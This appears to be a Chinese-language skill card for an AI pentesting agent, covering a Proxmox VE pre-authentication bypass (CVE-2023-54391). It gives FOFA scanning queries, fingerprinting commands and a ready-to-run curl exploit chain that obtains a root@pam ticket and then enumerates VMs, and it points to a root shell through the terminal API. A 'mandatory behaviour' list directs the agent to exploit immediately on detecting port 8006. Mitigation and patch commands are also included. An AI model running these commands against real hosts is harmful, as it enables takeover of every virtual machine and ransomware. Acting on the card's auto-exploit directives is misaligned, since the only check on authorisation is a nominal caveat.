---
name: 虚机府
description: >-
 Proxmox VE 7.0~8.0.3 免密认证绕过（CVE-2023-54391，CVSS 9.8）：
 单请求 tfa-challenge 参数绕过密码验证，直接获取 root@pam 全权票据。
 在野利用+勒索事件已确认（PSA-2026-00043-1）。
 
version: 1.0.0
metadata:
    tags:
      - proxmox
      - pve
      - cve-2023-54391
      - auth-bypass
      - tfa-challenge
      - pre-auth
      - root-takeover
      - ransomware
      - virtualization
      - hypervisor
      - critical
    category: infrastructure
    priority: 0
    attack_phases: [recon, exploit, post-exploit]
    target_stack: [proxmox-ve, libpve-access-control, perl]
---

# Proxmox VE 免密认证绕过 — CVE-2023-54391

> **CVSS 9.8 (v3.1) / 9.3 (v4.0) · 在野利用 · 公开 PoC · 勒索事件已确认**
> Advisory: PSA-2026-00043-1 (2026-09-01)

**前提**：目标在 `授权范围`。这是虚拟化管理面——拿到 root = 控制所有 VM/CT。

## 漏洞概要

| 项目 | 值 |
|------|---|
| CVE | CVE-2023-54391 |
| 影响 | Proxmox VE 7.0~7.4 + 初始 8.0（`libpve-access-control` 7.0-7 ~ < 8.0.4） |
| 修复 | `libpve-access-control` 8.0.4（2023-07-20） |
| 端口 | 8006（管理 Web UI + API） |
| 前提 | 目标账户无 2FA（默认 root@pam 无 2FA） |
| 类型 | Pre-auth 认证绕过（CWE-304：认证关键步骤缺失） |
| 后果 | 单请求获取 root@pam 全权票据 → 任意 API / root shell |

## 根因分析

```
POST /api2/json/access/ticket 接受 tfa-challenge 参数：

1. tfa-challenge 存在 → 代码认为是"第二步 2FA 验证"
2. 跳过密码验证（认为第一步已通过）
3. 目标账户无 2FA → 无 tfa.cfg 配置 → 早期返回
4. verify_ticket() 从未被调用 → 任意值通过
5. 签发完整 root@pam 票据（非半认证 TFA 票据）
```

## 成功口径

| 级别 | 条件 |
|------|------|
| L1 | 版本确认：`libpve-access-control` < 8.0.4 |
| L2 | 指纹确认：`:8006` 可达 + PVE 登录页 |
| L3 | 获取有效 `root@pam` ticket（等同 root 接管整台宿主机，授权内直接做） |

## 指纹识别

```bash
# 端口探测
curl -sk "https://TARGET:8006/" | grep -i proxmox

# 版本指纹（登录页 JS）
curl -sk "https://TARGET:8006/pve-docs/pve-admin-guide.html" | grep -oP 'version \K[0-9.]+'

# API 版本
curl -sk "https://TARGET:8006/api2/json/version" | python3 -m json.tool

# FOFA 测绘
# title="Proxmox" && port="8006"
# body="PVE.UserName" && port="8006"
python3 tools/space-search/fofa_query.py 'title="Proxmox Virtual Environment" && port="8006"' \
  --fields host,ip,port,title
```

## 漏洞验证（授权内拿 ticket 即接管）

```bash
# 方法1：检查包版本（需已有 SSH/shell）
dpkg -l libpve-access-control | grep -E '7\.[0-4]|8\.0\.[0-3]'
# 若输出 < 8.0.4 → 受影响

# 方法2：无认证探测（授权内直接做）
# 发送带 tfa-challenge 的登录请求
curl -sk -X POST "https://TARGET:8006/api2/json/access/ticket" \
  -d "username=root@pam&password=anything&tfa-challenge=bypass" \
  -w "\nHTTP_CODE: %{http_code}\n"

# 200 OK + 返回 ticket/CSRFPreventionToken → 漏洞存在
# 401 Unauthorized → 不受影响或已修复

# 方法3：检查 AccessControl.pm 是否有修复（需文件读取权限）
grep -c 'verify_ticket($tfa_challenge, 0, $username)' \
  /usr/share/perl5/PVE/AccessControl.pm
# 输出 3 → 已修复；< 3 → 受影响
```

## 利用链（授权内直接做——等同接管整台宿主机所有 VM）

```bash
# Step 1: 获取 root ticket
RESP=$(curl -sk -X POST "https://TARGET:8006/api2/json/access/ticket" \
  -d "username=root@pam&password=x&tfa-challenge=x")

TICKET=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['ticket'])")
CSRF=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['CSRFPreventionToken'])")

echo "Ticket: $TICKET"
echo "CSRF: $CSRF"

# Step 2: 使用票据调用任意 API
# 列出节点
curl -sk "https://TARGET:8006/api2/json/nodes" \
  -b "PVEAuthCookie=$TICKET" \
  -H "CSRFPreventionToken: $CSRF"

# 列出所有 VM
curl -sk "https://TARGET:8006/api2/json/cluster/resources?type=vm" \
  -b "PVEAuthCookie=$TICKET" \
  -H "CSRFPreventionToken: $CSRF"

# 获取 root shell（通过 VNC/terminal API）
# POST /nodes/{node}/terminal → websocket root shell
# 这等同于 root RCE —— 授权内直接做
```

## 探针

```bash
# 集成到本库探针
python3 炼蛊房/nday_route.py --signal "proxmox CVE-2023-54391"

# 手动探测：API 可达后再打 tfa-challenge 拿票
curl -sk -o /dev/null -w "%{http_code}" \
  "https://TARGET:8006/api2/json/version"
# 200 → PVE API 可达，进一步验证版本
```

## 应急缓解（报告用）

```bash
# 方法1：升级到受支持版本（唯一持久修复）
apt update && apt full-upgrade

# 方法2：临时补丁（EOL 系统应急）
sed -i.bck 's/^\t# This is the 2nd factor, use the password for the OTP response.$/\tverify_ticket($tfa_challenge, 0, $username);\n\t# This is the 2nd factor, use the password for the OTP response./' \
  /usr/share/perl5/PVE/AccessControl.pm

# 验证补丁生效
grep -c 'verify_ticket($tfa_challenge, 0, $username)' \
  /usr/share/perl5/PVE/AccessControl.pm
# 输出应为 3

# 重启服务
systemctl restart pvedaemon pveproxy

# 方法3：防火墙限制 8006 端口
iptables -A INPUT -p tcp --dport 8006 ! -s TRUSTED_MGMT_NET -j DROP

# 方法4：为所有账户启用 2FA（有 2FA 的账户不受影响）
```

## 在野威胁情报

- **勒索软件**：攻击者通过此漏洞获取 root → 加密所有 VM 磁盘 → 勒索
- **挖矿**：部署 cryptominer 到宿主机
- **PoC 公开**：Nebu Security 发布了完整 PoC gist
- **时间线**：漏洞 2023-07 被意外修复 → 2026-09-01 CVE 发布 → 同日在野利用报告

## 强制行为

1. **发现 :8006 + Proxmox 指纹 → 立刻走本卡**，禁止只报端口结案
2. **版本确认优先**：先 `dpkg -l` 或 API 版本判断是否受影响
3. **获取 ticket = root 接管 → 授权内直接做**（影响所有 VM/CT）
4. 证据落 `案卷/proxmox/`，脱敏 ticket 值

## 关联

| 场景 | 走哪 |
|------|------|
| 拿到 root 后提权/横向 | `linux-post-exploit` → `internal-tunnel` |
| 容器逃逸 | `container-security-testing` |
| 发现其他虚拟化平台 | `nday_route.py` |
| 勒索事件应急 | `incident-response` |

## 真源

- 手法：`传承/虚机府·免密.md`
- 工具：`python3 炼蛊房/nday_family_probe.py --family proxmox --base https://授权站:8006 --case <案卷>`
- Advisory: [PSA-2026-00043-1](https://forum.proxmox.com/threads/security-advisories.164493/)
- CVE: [CVE-2023-54391](https://www.cve.org/CVERecord?id=CVE-2023-54391)
- 技术分析: [Nathan Golez writeup](https://blog.nathangolez.com/2026/08/proxmox-ve-7-08-0-3-unauthenticated-single-request-root-auth-bypass)
- 技术分析: [Flawfence writeup](https://flawfence.com/blog/en/proxmox-ve-7-authentication-bypass-rce-cve-2023-54391/)
- Fix commit: `032e7d6d441f89a48cadfd7f47e957c8a561c022`
